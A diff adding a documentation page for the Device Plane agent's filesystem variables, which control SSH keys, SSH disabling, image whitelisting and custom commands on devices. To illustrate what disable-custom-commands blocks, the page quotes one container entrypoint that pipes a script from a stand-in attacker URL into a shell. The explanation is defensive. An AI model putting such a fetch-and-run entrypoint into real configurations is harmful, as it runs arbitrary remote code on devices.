@@ -1,0 +1,67 @@
+import Docs from '../../components/docs';
+
+<Docs title="Device API">
+
+# Device API
+
+## Variables
+
+Variables allow you to customize various aspects of Device Plane agent behavior. Variables are set through the filesystem meaning that interactions occur by placing files in a specific location (`/etc/deviceplane`). The agent detects these changes (without ever needing a restart) and changes behavior accordingly.
+
+Below is a reference list of flags available in the API. All of these flags should be placed in the `/etc/deviceplane` directory as a standalone file. For example, the `authorized-ssh-keys` file would exist as a file at `/etc/deviceplane/authorized-ssh-keys`.
+
+### authorized-ssh-keys
+
+The `authorized-ssh-keys` variable sets the list of allowed keys for SSH access to a device. This file follows the standard `authorized_keys` format for SSH.
+
+Adding this variable fundamentally changes how SSH authorization works. Normally authorization for SSH occurs in the Device Plane backend as all other API requests are. After adding this variable the agent will begin also authorizing using SSH keys.
+
+SSH via CLI is currently the only supported method when using this variable. SSH via the UI is not yet supported when using this variable.
+
+Here is a list of implications with this change.
+
+- If a bad actor gets access to a Device Plane access key then they won't be able to SSH to any devices without also having an authorized SSH key
+- If you lose access to your SSH keys you will have no way of accessing your device
+
+### disable-ssh
+
+The `disable-ssh` variable disables SSH access to the device. This should be an empty file; its presence or absence is all that's needed.
+
+This variable is useful for restricting SSH access from the side of the device. For example, imagine a device with a touchscreen in use by a customer who would prefer to have SSH access to their device allowed only when they explicitly opt-in. The variable `disable-ssh` could be present on the device by default, and then the customer could opt-in to have their device accessed via some type of settings page in the running application. This settings page could create or remove `/etc/deviceplane/authorized-keys` to turn on or off SSH access.
+
+### whitelisted-images
+
+> It's recommended to use the `whitelisted-images` variable in conjunction with `disable-custom-commands`.
+
+The `whitelisted-images` variable sets the list of images that can be used on a device. If this file is nonexistent or empty, any image will be allowed.
+
+An image is allowed if its name is prefixed by a line in the file.
+
+For example, the following `whitelisted-images` file will allow:
+
+1. The `redis` image, with any tag, or no tag (which defaults to latest)
+1. And any images from the `myorg` org (e.g. `myorg/deployimage`)
+
+```
+redis
+myorg/
+```
+
+Here is a list of implications with this change.
+
+- If a bad actor gets access to a Device Plane access key then they won't be able to launch images that aren't in your `whitelisted-images` file.
+  - If all images that run on your device are under your org name on DockerHub (e.g. `myorg/`), then keeping this list up to date is easy!
+
+### disable-custom-commands
+
+> It's recommended to use the `whitelisted-images` variable in conjunction with `disable-custom-commands`.
+
+The `disable-custom-commands` variable disables custom commands in the application config. Like `disable-ssh`, this should be an empty file; its presence or absence is all that's needed.
+
+When this variable is set, the `command` and `entrypoint` keys are not allowed to be used. The agent will refuse to run services that use the keys and log an error.
+
+Here is a list of implications with this change.
+
+- If a bad actor gets access to a Device Plane access key then they won't be able to change the `entrypoint`/`command` of a container to execute arbitrary code. For example, `entrypoint: curl http://attackersurl.test | sh`, will be disallowed.
+
+</Docs>
